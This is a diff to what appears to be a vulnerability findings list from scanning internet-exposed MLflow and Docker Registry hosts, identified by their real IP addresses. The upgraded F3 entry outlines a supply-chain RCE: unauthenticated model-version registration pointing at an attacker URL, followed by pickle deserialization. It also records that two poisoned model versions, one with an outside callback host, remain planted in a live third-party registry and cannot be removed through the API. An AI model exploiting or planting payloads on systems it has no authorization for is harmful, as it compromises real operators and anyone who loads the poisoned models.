@@ -76,10 +76,21 @@ F2 [CRITICAL] Live exploitation artifact on 168.138.146.91
   Timestamps cluster around May 2026 (Unix ts 1778457xxx)
   Host also has 100 registered models (active ML infrastructure, not a honeypot)
 
-F3 [HIGH] S3 bucket name exposure via artifact_location
-  103.242.173.183:5000 -> experiments reference s3://mlflow-art/
-  Artifact URIs returned without auth expose cloud storage topology.
-  Enables: bucket enumeration, public-ACL check, credential pivot if params contain keys.
+F3 [HIGH->CRITICAL UPGRADED] S3 bucket exposure + supply chain RCE on 103.242.173.183
+  MLflow 3.0.0rc0 (confirmed via /version -- prior 1.25.1 assumption was Cornell image, wrong target).
+  Original finding: artifact_location exposes s3://mlflow-art/ and full artifact URI map (540 exps).
+  Upgraded after PoC (2026-06-29): write surface confirmed -- unauth model registry write accepted.
+  F3i [CRITICAL] Supply chain RCE via model-versions/create + pickle deserialization (CVSS 9.8).
+    Attack: POST /registered-models/create (200), POST /model-versions/create {source:http://attacker/} (200).
+    Victim: mlflow.pyfunc.load_model() -> client fetches attacker URL -> pickle.loads() -> RCE.
+    PoC: confirmed in sandboxed local test. Callback received host/user/cwd/pid/pyver. /tmp/pwned_by_pickle created.
+  F3j [HIGH] Standing IoCs: 2 poisoned model versions in live registry, unremovable via API (DELETE=405).
+    PwnModel_1782709980 (source: http://45.153.102.179:9998/external_model/)
+    RCE_PoC_1782710409  (source: http://127.0.0.1:8888/model/)
+    Defender cleanup requires direct SQLite access or full DB wipe.
+  F3k [MEDIUM] MLflow 3.0.0rc0 (pre-stable release candidate, ~April 2025).
+  BLOCKED on this host: SQL injection, path traversal, file:// source, server-side SSRF (egress restricted).
+  See: f3-poc.md for full PoC detail.
 
 F4 [HIGH] Docker Registry false positives on port 5000 (4 hosts)
   129.158.44.37, 128.253.51.99, 43.134.33.91 (+ 1 more) returned Docker Registry fingerprint.
